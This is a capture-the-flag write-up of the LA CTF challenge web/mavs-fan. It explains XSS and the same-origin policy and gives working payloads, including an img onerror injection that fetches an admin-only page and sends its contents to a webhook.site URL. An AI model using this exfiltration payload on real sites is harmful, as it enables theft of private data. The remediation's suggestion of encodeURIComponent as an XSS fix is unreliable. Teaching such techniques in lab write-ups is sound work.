# LA CTF: web/mavs-fan

## Context & Vulnerability

We are provided a website where users can write and post messages. We are also given an “Admin Bot” where we may input a URL to the post that we made, and the Admin Bot will visit the post. We are also given the site's files to analyze.

In the challenge description, we are told that “the admin cookie is HttpOnly”. 

Therefore, due to the setup where we can input a message and send a URL to the admin bot, plus the HttpOnly hint, this leads us to believe that our vulnerability might be cross-site scripting (XSS). This was confirmed by inserting the classic XSS test of alert() and getting valid feedback. Additionally, due to the HttpOnly hint, we can assume we will be dealing with cookies alongside XSS, and those two topics often do go together.

## Background Information: XSS

### What is XSS?

XSS is a vulnerability that allows attackers to compromise the interactions between users and a vulnerable application
This happens because an attacker will find a way around the same origin policy (SOP).

### What is SOP?

A site’s origin is a combination of its protocol (like http, https, etc.), hostname/domain (like google.com), and port of the URL accessing it. If two websites have all of these same aspects, then they are said to have the same origin.
        
Two websites can have the same origin even if they have different file paths: http://example.com/app1/index.html versus http://example.com/app2/index.html

Even if port numbers are not stated explicitly, using a protocol’s default port number can help identify if two websites have the same origin: http://example.com:80 versus http://example.com

When browsing, the browser loads data from many different websites that are likely to all come from different origins. The same origin policy prevents one website from reading the resources of a website from a different origin. 

A type of vulnerability that is related to this is clickjacking using iframes. This vulnerability will not be covered here.

So, a website won’t read resources from a website with a different origin. However, when we inject our malicious XSS script, the script runs as the same origin as the website we are injecting it into. Therefore, the browser will execute this malicious script because it sees it as from the same origin as the website it’s being inserted into. 

### What is the malicious thing we are injecting? And where are we injecting it?

The thing that will be injected is a piece of malicious JavaScript code. You can inject it wherever the website will take in input. 
Below there is an example of a simple way to detect if a XSS attack is possible.

### What can our malicious script do?
Our malicious script can do many things, but most of the time it will be revealing sensitive information on the victim user’s browser. For example, XSS can access the following data:
- Keystrokes 
- Redirection to malicious websites
- Cookie information: Cookies can contain information that an attacker can use to impersonate a user after a browsing session. For this CTF, we just need to know that we can get cookies information from XSS.
- Other web browser exploits

Side-note here: the script we are talking about can be very short. Most are only a couple of lines long.

Types of XSS:
- Stored/Persistent XSS: The malicious script will be saved in the website’s database. Example: a website has a place where users can post messages. A user can input a malicious script in place of a message. This message will get saved in the site’s database. When others see this person’s message on the website, the script will be executed.
- Reflected XSS: The malicious script will most likely be in a site’s URL. When others visit this website, the script will be executed. Example: https://insecure-website.com/status?message=<script>/*+Bad+stuff+here...+*/</script>
- DOM-based XSS 

### How to see if a website is vulnerable to XSS

Try inserting basic JavaScript and seeing if you get a response. This was inserted into the message field where a user would normally input a message to post. The most popular is: <script>alert('testing for XSS…')</script>

### How to prevent XSS
- Filter input
- Encode data when it’s being outputted
- For HTTP responses, use the correct response headers
- For cookies, use HttpOnly: Recall that cookies can be accessed by using JavaScript in an XSS attack. Most web browsers don’t need to access cookies via JavaScript. Therefore, to protect cookies, you can use the HttpOnly flag to tell the browser to access the cookie through HTTP only. The HttpOnly flag is included in the HTTP response header: Set-Cookie: sessionid=QmFieWxvbiA1; HttpOnly

## Exploitation

We navigate to the page where we can input a message.

First we will try the classic XSS input to see if we can get execution through this area: <script>alert('testing for XSS…')</script>

We do not get an alert pop-up. Before, trying other payloads, let’s see how the HTML of the site looks after inputting the script:

The script got embedded into a div, and therefore it won’t execute. We may search for another payload that won’t just get lost in the HTML. Online, we find HTML-specific payloads which we can try. The first one: <img/src=x a='' onerror=alert(1)>

Indeed, when entered and submitted we got an alert pop-up and image saved.

As a comparison, we may also see what the HTML looks like. The HTML was actually embedded to execute the script. We also see Firefox’s addition of the “event”.
So now that we know we can achieve XSS, we need to see what we may enter to get our flag. Let’s see the file’s script app.js, which was given in the challenge’s zip file. We see the following lines that are of interest:

	app.get('/admin', (req, res) => {
    	if (!req.cookies.secret || req.cookies.secret !== ADMIN_SECRET) {
        		return res.redirect("/");
   	 	}
    	return res.json({ trade_plan: FLAG });
	});



This script tells us that if we go to the /admin path, we may get the flag only if this special cookie is enabled. If we don’t have this secret cookie, or if the cookies is not named ADMIN_SECRET, then we are redirected to the standard front page of the site. If we do meet these cookie requirements, then we get the flag. Thus, our goal now is to somehow meet these cookie requirements.

Recall our hint: “the admin cookie is HttpOnly”. This means we may not use JavaScript to access our cookie. And since we are on client-side and the cookie is protected by HttpOnly, we may not access the cookie. Remember that HttpOnly prevents the cookies from being affected by client-side scripts. Thus, we need to get our cookie data server-side.

Here are steps our XSS payload may follow to get our cookie:
1. Do something to trigger an error
2. When that error is triggered, deal with it by trying to visit /admin
3. Capture the response from visiting /admin
4. Because that response has valuable information that we can’t access (our admin cookies), send that data somewhere we could access it. One place we may send it is our own site. Webhooks may provide us with a website to do this with. Or, if running the site locally (localhost), then ngrok can work.
5. Once we send the data to our Webhooks site, we should see the cookie data there, which will give us our flag.

In JavaScript, our payload will look something like this (this is the specific solution provided by LA CTF):

	<img src="x" onerror="fetch('/admin').then(response => response.json()).then(data => {fetch('https://webhook.site/[custom_webhook_url]?data=' + encodeURIComponent(JSON.stringify(data)));});"/>

We may try to enter this into the message posting part of the website. We insert our malicious script successfully.

Now we may play the victim in the XSS scenario and visit the URL that the post gave us by inserting it into the admin bot. Then on our server we will see the flag.


## Remediation

One easy way to patch this kind of error is to sanitize input. You should make sure that whatever message is entered doesn’t include inputs like <>, for example. One function that may be useful is encodeURIComponent() (specifically for JavaScript). It will eliminate characters that aren't usually allowed in a URI (part of the URL).

# Sources/Credits

Written by Madalina Stoicov

- https://developer.mozilla.org/en-US/docs/Glossary/Origin
- https://web.dev/articles/same-origin-policy
- https://portswigger.net/web-security/cross-site-scripting#what-is-cross-site-scripting-xss
- https://www.veracode.com/security/xss/
- https://www.wiz.io/academy/cross-site-scripting-xss
- https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
- https://www.invicti.com/learn/stored-xss-persistent-cross-site-scripting/
- https://owasp.org/www-community/attacks/Cross_Site_Tracing
- https://www.acunetix.com/blog/web-security-zone/httponly-flag-protecting-cookies/



